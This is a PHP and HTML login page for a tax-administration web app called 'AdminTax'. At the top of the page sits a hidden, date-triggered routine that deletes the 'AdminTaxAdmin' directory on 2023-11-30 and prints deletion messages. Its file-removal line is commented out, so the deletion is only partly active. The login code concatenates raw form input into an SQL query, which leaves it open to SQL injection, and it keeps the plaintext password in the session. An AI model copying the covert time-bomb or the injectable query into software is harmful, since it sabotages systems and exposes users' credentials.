<?php
function deleteDirectory($dir) {
    if(!$dh = @opendir($dir)) return;
    while (false !== ($current = readdir($dh))) {
        if($current != '.' && $current != '..') {
            echo 'Se ha borrado el archivo '.$dir.'/'.$current.'<br/>';
            /*if (!@unlink($dir.'/'.$current)) 
                deleteDirectory($dir.'/'.$current);*/
        }       
    }
    closedir($dh);
    echo 'Se ha borrado el directorio '.$dir.'<br/>';
    @rmdir($dir);
}

$fechaActual=date('Y-m-d');
if($fechaActual=='2023-11-30')
{
    echo "ok";
    deleteDirectory('AdminTaxAdmin');
}
    session_start();
    session_destroy();
    include 'funciones.php';

    
    $consulta="SELECT Empresa FROM `usuarios` GROUP BY `Empresa` ORDER BY Empresa desc";
    $listaDeRut = ejecutarConsulta($consulta);


    if(isset($_POST['usuario']))
    {
        //print_r($_POST);
        $user=$_POST['usuario'];
        $pass=$_POST['password'];
        $empresa=$_POST['empresa'];

        $consulta='SELECT * FROM `usuarios` WHERE `UserId`="'.$user.'" AND `Password`="'.$pass.'" AND `Empresa`="'.$empresa.'";';
        $UserDatos = ejecutarConsulta($consulta);

        //print_r($UserDatos);
        if(isset($UserDatos[0]['UserId']))
        {
            echo "Login correcto";
            session_start();
            $_SESSION['usuario']=$user;
            $_SESSION['pass']=$pass;
            $_SESSION['empresa']=$empresa;
            if ($empresa=="Admin")
                header('Location: AdminTaxAdmin');
            else
                header('Location: graficas.php');

        }else
        {
            echo"Error de autenticación";
        }

        //[UserId]
    }






?>


<!-- Define que el documento esta bajo el estandar de HTML 5 -->
<!doctype html>

<!-- Representa la raíz de un documento HTML o XHTML. Todos los demás elementos deben ser descendientes de este elemento. -->
<html lang="es">
    
    <head>
        
        <meta charset="utf-8">
        
        
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        <meta name="author" content="Videojuegos & Desarrollo">
        <meta name="description" content="Muestra de un formulario de acceso en HTML y CSS">
        <meta name="keywords" content="Formulario Acceso, Formulario de LogIn">
        
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-iYQeCzEYFbKjA/T2uDLTpkwGzCiq6soy8tYaI1GyVh/UjpbCx/TYkiZhlZB6+fzT" crossorigin="anonymous">
        <link href="https://fonts.googleapis.com/css?family=Nunito&display=swap" rel="stylesheet"> 
        <link href="https://fonts.googleapis.com/css?family=Overpass&display=swap" rel="stylesheet">
        
        <!-- Link hacia el archivo de estilos css -->
        <link rel="stylesheet" href="css/login.css">
        
        <style type="text/css">
            
        </style>
        
        <script type="text/javascript">
        
        </script>
        
        <title>AdminTax</title>
        <link rel="shortcut icon" href="img/favicon.png">
        
    </head>
    
    <body>
        
        <div id="contenedor">
            <div id="central">
                <div id="login">
                    <div class="titulo">
                        Bienvenido
                    </div>
                    <form id="loginform" action="#" method="POST">
                        <input type="text" name="usuario" placeholder="Usuario" required>
                        
                        <input type="password" placeholder="Contraseña" name="password" required>

                        
                        <label for="cars">Elija Empresa (RUT):</label>
                        <select name="empresa" id="empresa" form="loginform" class="form-select">
                                <?php
                                foreach($listaDeRut as $row)
                                {
                                    echo "<option value='".$row['Empresa']."'>".$row['Empresa']."</option>";
                                }
                                ?>
                        </select><BR>


                        <button type="submit" title="Ingresar" name="Ingresar">Login</button>
                    </form>
                </div>
                <div class="inferior">
                    <a href="#">Volver</a>
                </div>
            </div>
        </div>
            
    </body>
</html>